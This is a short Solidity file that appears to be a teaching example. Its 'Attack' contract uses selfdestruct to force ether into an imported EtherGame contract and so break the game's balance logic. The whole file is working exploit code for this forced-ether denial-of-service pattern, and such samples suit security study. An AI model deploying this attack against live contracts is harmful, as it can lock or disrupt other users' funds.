// SPDX-License-Identifier: MIT
pragma solidity 0.7.6;
import "./EtherGame.sol";

contract Attack {
    EtherGame etherGame;
    address public target;

    constructor(address _etherGameAddress) {
        target = _etherGameAddress;
        etherGame = EtherGame(_etherGameAddress);
    }

    /** Sends ETH to the _etherGameAddress
     */
    function attack() public payable {
        // You can simply break the game by sending ether so that
        // the game balance >= 3 ether

        // cast address to payable
        // "payable" allows a function to receive ether while being called
        address payable addr = payable(address(etherGame));
        selfdestruct(addr);
    }
}